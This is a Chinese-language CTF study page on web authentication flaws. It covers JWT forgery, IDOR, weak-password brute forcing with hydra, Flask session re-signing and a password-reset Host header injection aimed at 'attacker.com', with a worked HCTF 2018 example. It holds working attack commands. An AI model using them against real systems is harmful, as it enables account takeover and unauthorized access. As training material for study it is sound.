# 认证与权限

关键词：认证 权限 JWT 越权 IDOR 弱口令 会话 伪造 token 逻辑漏洞 会话固定

## ① 识别指纹

- 页面是登录、注册、找回密码、个人中心
- 题目给了普通账号，flag 在 admin 用户里
- Cookie 里是三段用 `.` 分隔的 base64 → JWT
- Cookie 是普通 base64，解出来是 `{"role":"user","id":2}` 这种明文
- URL 或 JSON 里有 `uid=`、`user_id=`、`id=`、`order_id=`
- 响应头 `Set-Cookie: session=...`，Flask 的 session 是 base64 加签名
- 源码里出现 `jwt.decode`、`session['name']`、`current_user`
- 题目名是 **Login、Admin、Auth、JWT、IDOR** 的组合

## ② 考什么

- JWT 结构：`header.payload.signature`
- `alg: none` 绕过（`none` / `None` / `NONE` 三种写法）
- JWT 弱密钥爆破（HS256）
- `kid` 注入（路径穿越、SQL 注入、命令注入到密钥读取）
- HS/RS 算法混淆（把公钥当 HMAC 密钥）
- `jku` / `x5u` 指向可控的 JWKS
- 水平越权 / IDOR（改 id 读别人的数据）
- 垂直越权（普通用户访问 admin 接口）
- 弱口令、默认口令、账号枚举
- Cookie/Session 伪造（Flask `SECRET_KEY`、PHP session）
- 密码重置逻辑漏洞（token 可预测、Host 头注入、验证码回显）
- PHP 弱比较与数组绕过（`md5`、`==`）

## ③ 判断流程

> 认证题先找"身份是从哪里读出来的"。改对那个字段，比爆破一万次快。

1. 有账号 → 登录后抓全部请求，标出每个请求里的身份字段（Cookie、`uid`、`role`、JWT）→ 跳第 2 条；没有账号 → 跳第 8 条
2. 看认证载体：Cookie 是 `xxx.yyy.zzz` 三段 → JWT，跳第 5 条；base64 解码后是 JSON 且末尾带签名 → Flask session，跳第 11 条；解出纯明文 → 跳第 3 条；只是随机串 → 跳第 4 条
3. Cookie/隐藏域 base64 解码后是 JSON 或 `role=user` → 改成 `admin`/`1` 重新编码重放 → 进 admin，结束；页面仍按原身份渲染 → 跳第 10 条
4. URL/body 里有 `uid`/`user_id`/`id` → 改成相邻 id（1、2、0）重放，看是否返回他人数据 → 是则 IDOR，遍历到 admin，结束；始终只返回自己的数据 → 跳第 5 条
5. JWT 先 base64 解码 header 与 payload，看 `alg`、`kid`、`jku` → `alg=HS256` 跳第 6 条；`alg=RS256` 跳第 7 条；`alg=none` 直接改 payload 重放，结束
6. HS256 → `jwt_tool -C -d` 跑字典爆破密钥 → 出密钥就重签 `{"role":"admin"}`，结束；爆不出 → 试 `alg:none` 的三种大小写，仍失败 → 跳第 7 条
7. 有 `kid` → 试 `kid=../../../../dev/null`（空密钥 HMAC）、在 `kid` 里拼 SQL；有 `jku`/`x5u` → 指向自己的 JWKS；`RS256` → 用公钥当 HMAC 密钥重签（HS/RS 混淆）；三种都失败 → 回第 1 条，确认服务端是否真的走 JWT 校验
8. 无账号 → 先试默认/弱口令：`admin/admin`、`admin/123456`、`admin/admin888`，以及题干提示；成功 → 回第 1 条重新收集
9. 有注册/找回密码 → 走一遍，看 token 是否可预测（时间戳、`md5(email)`、自增 id）；重置链接用 `Host` 头拼接 → 改成自己的域名收信，结束
10. 普通账号能登录但 admin 接口 403 → 在请求里加/改 `role=admin`、`is_admin=1`、`X-Forwarded-For: 127.0.0.1` 试垂直越权，成功即结束
11. Cookie 是 Flask session → 找 `SECRET_KEY`（源码、`.git`、`config.py`、弱密钥字典），用 `flask-unsign` 重签，结束
12. 以上都不成立 → 回第 1 条：身份字段扩到 `X-User-Id`、`Authorization`、body 里的 JWT；检查是否有第二个登录入口或子路径

## ④ 工具与命令

```bash
# 手工解码 JWT（去掉 base64url 的 - _ 并补 padding）
python3 - <<'PY'
import base64, json
jwt = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature"
for part in jwt.split('.')[:2]:
    part += '=' * (-len(part) % 4)
    print(json.loads(base64.urlsafe_b64decode(part)))
PY
```

```bash
# jwt_tool：解码、alg:none、爆破、HS/RS 混淆
python3 jwt_tool.py "$JWT" -d                    # 解码 header/payload
python3 jwt_tool.py "$JWT" -X a                  # alg:none
python3 jwt_tool.py "$JWT" -C -d rockyou.txt     # 字典爆破 HS256 密钥
python3 jwt_tool.py "$JWT" -X k -pk public.pem   # HS/RS 混淆

# hashcat 也可以直接跑 JWT 的 HS256
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

```bash
# Flask session：解码、爆破、重签
pip install flask-unsign
flask-unsign --decode --cookie '<session>'
flask-unsign --unsign --cookie '<session>' --wordlist rockyou.txt
flask-unsign --sign --cookie "{'name':'admin','user_id':1}" --secret 'ckj123'

# 旧工具等价写法
python3 flask_session_cookie_manager3.py decode -c '<session>' -s 'ckj123'
python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'name':'admin'}"
```

```bash
# IDOR：换 id 遍历，注意保存每一条响应
for i in $(seq 0 20); do
  echo "== $i"; curl -s -H "Cookie: session=$S" "http://t.cn/api/user/$i"; echo
done
```

```bash
# 弱口令爆破（先确认失败特征，F= 后面填响应里的失败关键字）
hydra -l admin -P rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

# 默认口令先手工试，成本最低
# admin/admin  admin/123456  admin/admin888  admin/password  guest/guest  test/test
```

```bash
# 密码重置：Host 头注入，让重置链接指向自己
curl -s -X POST "http://t.cn/reset" -H "Host: attacker.com" -d "email=victim@x.com"
```

## ⑤ 常见坑

| 现象 | 实际原因 | 正确应对 |
|---|---|---|
| 改完 JWT payload 返回 401 | 签名没重算，或服务端校验了签名 | 先试 `alg:none`，不行再爆破密钥 |
| `alg:none` 三种写法都失败 | 服务端强制了算法，或只接受特定 `kid` | 转弱密钥爆破或 `kid` 注入 |
| 字典跑完没有结果 | 密钥不在字典里 | 补题目名、`secret`、`key`、`jwt`，再看源码注释 |
| HS/RS 混淆失败 | 公钥不是 PEM，或服务端固定了 `alg` | `openssl rsa -pubin -in pub.pem -outform PEM` 转换后重试 |
| 改 `uid` 返回 403 | 后端做了归属校验，不是 IDOR | 换同角色的其他 id，或试参数污染 |
| 改 `id` 永远返回自己的数据 | 服务端从 session 取 id，忽略参数 | 改 session/Cookie，而不是改 URL |
| Flask session 改不动 | 没有 SECRET_KEY，签名对不上 | 找源码、`.git`、`config.py`，或跑弱密钥字典 |
| 重置邮件一直收不到 | token 绑定了 Host，或 token 直接在响应里回显 | 改 `Host` 指向自己，或直接读响应 |
| 默认口令字典无效 | 题目所谓"弱口令"是题干提示的那一个 | 重读题干、注册接口、源码注释 |

## ⑥ 例题

**题目**：`[HCTF 2018] admin`
**来源**：BUUCTF 复现平台 / CTFtime（原题出自 HCTF 2018）
**题干**：一个 Flask 博客，提供注册、登录、修改密码，提示要成为 admin 才能拿 flag。

**关键观察**：

- 注册普通账号登录后，页面源码里是 `{% if current_user.is_authenticated and session['name'] == 'admin' %}` 才输出 flag
- `/change` 页面源码泄露了原题 GitHub 仓库地址，`config.py` 里写着 `SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'`
- 既然 `SECRET_KEY` 已知，Flask session 就可以在本地重签，把 `name` 改成 `admin`

**走了哪条链**：第 1 条（有普通账号，收集 Cookie）→ 第 2 条（Cookie 是 Flask session，不是 JWT）→ 第 11 条（拿到 `SECRET_KEY` 后重签 session）。

**命令与输出**：

```bash
# 1. 解码自己的 session，确认字段名
flask-unsign --decode --cookie '<你的 session>'
# → {'name': 'xxx', 'user_id': 'xx'}

# 2. 用泄露的 SECRET_KEY 重签
flask-unsign --sign --cookie "{'name': 'admin', 'user_id': '1'}" --secret 'ckj123'
# → 新的 session 字符串

# 3. 替换 Cookie 访问首页
curl -s -H "Cookie: session=<新 session>" "http://t.cn/index" | grep -i flag
```

`user_id` 的取值以目标实际字段为准，有的环境不需要这个字段，只改 `name` 就能过。换成 admin 后页面直接渲染 flag。

**结果**：flag 以原题平台为准。

::: tip 一题多解
原题还有两条路：注册 `ᴬdmin` 之类的 Unicode 字符，靠 `nodeprep` 归一化后被当成 `admin`；或者直接对 admin 账号跑弱口令。识别指纹和判断流程不变，第 3 条、第 8 条都能走到。
:::

::: tip flag 说明
本页例题的 flag 随平台和容器实例变化，不在页内固定。练习目标是走通判断流程。
:::
